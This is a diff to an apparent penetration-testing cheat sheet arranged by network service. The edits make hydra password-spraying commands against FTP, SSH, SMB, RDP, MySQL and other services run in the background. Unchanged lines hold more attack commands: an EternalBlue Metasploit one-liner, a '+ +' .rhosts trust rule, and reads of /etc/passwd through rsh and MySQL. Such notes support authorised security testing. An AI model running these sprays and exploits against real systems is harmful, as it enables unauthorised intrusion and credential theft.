@@ -387,7 +387,7 @@ for host in $(cat hosts); do
 
 [*] (21) FTP
 +---------- Spray Service ----------+
-hydra -I ftp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+(hydra -I ftp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
 +---------- List Files ----------+
 nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls
@@ -406,7 +406,7 @@ get file.txt -
 
 [*] (22) SSH
 +---------- Spray Service ----------+
-hydra -I ssh://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+(hydra -I ssh://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
 +---------- Key Types ----------+
 ssh -Q key
@@ -446,7 +446,7 @@ ssh $USERNAME@$TARGET -i id_dsa -L 33060:Localhost:33060 -L 5000:Localhost:5000
 
 [*] (23) Telnet
 +---------- Spray Service ----------+
-hydra -I telnet://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+(hydra -I telnet://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
 +---------- Login to Service ----------+
 telnet --user '$USERNAME' $TARGET
@@ -566,14 +566,14 @@ for host in $(cat dc-hosts); do rpcclient -U "" $host -N -c "enumdomusers"; done
 
 [*] (161) SNMP
 +---------- Spray Service ----------+
-hydra -I snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -t15 2>/dev/null
+(hydra -I snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -t15 2>/dev/null &)
 
 +---------- Read Service ----------+
 snmp-check $TARGET -c COMMUNITY_STRING -v 2c
 
 [*] (389) LDAP
 +---------- Spray Service ----------+
-hydra -I ldap2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+(hydra -I ldap2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
 +---------- Domain Information ----------+
 nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
@@ -608,7 +608,8 @@ godap $TARGET -u '$USERNAME' -p '$PASSWORD' -d '$DOM'
 
 [*] (445) SMB
 +---------- Spray Service ----------+
-hydra -I smb2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+(hydra -I smb://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
+(hydra -I smb2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
 +---------- Get Shares, Users and Groups ----------+
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
@@ -639,7 +640,7 @@ msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARG
 
 [*] (512-514) RSERVICES
 +---------- Spray Service ----------+
-hydra -I rlogin://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+(hydra -I rlogin://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
 +---------- Allow All Connections ----------+
 echo '+ +' > ~/.rhosts; chmod 600 ~/.rhosts
@@ -653,7 +654,7 @@ rsh -l $USERNAME $TARGET cat /etc/passwd
 
 [*] (1433) MSSQL
 +---------- Spray Service ----------+
-hydra -I mssql://$host -L usernames -P passwords -e n -t15 2>/dev/null
+(hydra -I mssql://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
 +---------- Bruteforce Using Defaults ----------+
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
@@ -709,7 +710,7 @@ setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR
 
 [*] (3306) MySQL
 +---------- Spray Service ----------+
-hydra -I mysql://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+(hydra -I mysql://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
 +---------- Bruteforce Using Defaults ----------+
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mysqlusernames
@@ -729,7 +730,7 @@ mysql -h "$TARGET" -u root --skip-ssl -p'$PASSWORD' -e "SELECT LOAD_FILE('/etc/p
 
 [*] (3389) RDP
 +---------- Spray Service ----------+
-hydra -I rdp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+(hydra -I rdp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
 +---------- Login to Service ----------+
 xfreerdp3 /v:'$TARGET' /d:'$DOM' -sec-nla /tls:seclevel:0 /dynamic-resolution +clipboard +drive:Downloads,"$HOME/Upload/"
